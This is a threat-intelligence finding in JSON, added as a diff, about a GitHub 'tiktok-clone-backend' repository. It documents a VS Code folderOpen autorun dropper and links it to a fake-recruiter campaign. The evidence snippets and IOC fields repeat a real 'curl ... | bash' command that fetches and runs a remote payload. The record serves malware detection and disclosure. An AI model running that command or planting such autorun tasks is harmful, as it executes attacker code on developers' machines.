@@ -1,0 +1,128 @@
+{
+  "finding": {
+    "key": "repository:kreliannn/tiktok-clone-backend",
+    "kind": "repository",
+    "family": "",
+    "id": "kreliannn/tiktok-clone-backend",
+    "url": "https://github.com/Kreliannn/Tiktok-Clone-BACKEND",
+    "registry": "github",
+    "owner": "kreliannn",
+    "status": "confirmed",
+    "confidence": "",
+    "score": 9,
+    "detection_method": "malicious_owner",
+    "attribution": "",
+    "campaign_id": "GW-C-498a0aeb",
+    "rules": "install_hook/vscode-autorun; obfuscation/atob",
+    "evidence_locations": ".vscode/tasks.json:0; services/.vscode/tasks.json:0; routes/.vscode/tasks.json:0; models/.vscode/tasks.json:0; middleware/.vscode/tasks.json:0; middleware/validation/.vscode/tasks.json:0; interface/.vscode/tasks.json:0; controllers/.vscode/tasks.json:0; auth/.vscode/tasks.json:0; index.ts:12",
+    "c2_hosts": "default-configuration.vercel.app",
+    "iocs": "default-configuration.vercel.app; https://default-configuration.vercel.app/settings/linux?flag=9-test; curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash; .vscode/tasks.json",
+    "matched_signatures": "",
+    "reasons": "repository under owner Kreliannn of a known-malicious repo | Tier-2 confirmed (bash score 9)",
+    "osm_status": "submitted",
+    "osm_threat_id": "db41206a-e6c4-40ad-81f4-3c0cb406d0fd",
+    "first_seen": "hunt-20260702T050848Z",
+    "last_seen": "hunt-20260702T050848Z",
+    "evidence_file": "repositories/kreliannn_tiktok-clone-backend.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "services/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "routes/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "models/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "middleware/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "middleware/validation/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "interface/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "controllers/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "auth/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "index.ts",
+      "line": 12,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "const src = atob(process.env.AUTH_API_KEY);"
+    }
+  ],
+  "commit_sha": null,
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/kreliannn/tiktok-clone-backend",
+    "version_info": "all",
+    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json, services/.vscode/tasks.json, routes/.vscode/tasks.json and 6 more files.\nOutbound: fetch-and-run. It downloads code from default-configuration.vercel.app and executes it (.vscode/tasks.json, services/.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nThe same dropper is planted in 9 directories.\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: default-configuration.vercel.app.\nCampaign GW-C-498a0aeb: one of 89 confirmed repos across 14 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 3 distinct hosts, including default-configuration-sandy.vercel.app, default-configuration.vercel.app, vscode-extension-260120.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea PolinRider activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape; Payload host is curated known-DPRK / Contagious-Interview infrastructure: default-configuration.vercel.app.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: .vscode/tasks.json, services/.vscode/tasks.json, routes/.vscode/tasks.json, models/.vscode/tasks.json, middleware/.vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from default-configuration.vercel.app and executes it (.vscode/tasks.json, services/.vscode/tasks.json).\n- .vscode/tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed (+8 more)\n- Attacker hosts: default-configuration.vercel.app",
+    "publisher": "kreliannn",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "polinrider",
+      "contagious-interview",
+      "fake-recruiter",
+      "dprk",
+      "north-korea",
+      "vscode-folderopen-autorun",
+      "dropper"
+    ],
+    "evidence_references": "https://github.com/kreliannn/tiktok-clone-backend/blob/HEAD/.vscode/tasks.json\nhttps://github.com/kreliannn/tiktok-clone-backend/blob/HEAD/services/.vscode/tasks.json\nhttps://github.com/kreliannn/tiktok-clone-backend/blob/HEAD/routes/.vscode/tasks.json\nhttps://github.com/kreliannn/tiktok-clone-backend/blob/HEAD/models/.vscode/tasks.json\nhttps://github.com/kreliannn/tiktok-clone-backend/blob/HEAD/middleware/.vscode/tasks.json\nhttps://github.com/kreliannn/tiktok-clone-backend/blob/HEAD/middleware/validation/.vscode/tasks.json\nhttps://github.com/kreliannn/tiktok-clone-backend/blob/HEAD/interface/.vscode/tasks.json\nhttps://github.com/kreliannn/tiktok-clone-backend/blob/HEAD/controllers/.vscode/tasks.json\nhttps://github.com/kreliannn/tiktok-clone-backend/blob/HEAD/auth/.vscode/tasks.json\nhttps://github.com/kreliannn/tiktok-clone-backend/blob/HEAD/index.ts#L12",
+    "verified_iocs": "default-configuration.vercel.app\nhttps://default-configuration.vercel.app/settings/linux?flag=9-test\ncurl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash\n.vscode/tasks.json",
+    "contributors": [],
+    "first_seen": "2026-07-02T05:08:48Z",
+    "last_seen": "2026-07-02T05:08:48Z"
+  }
+}
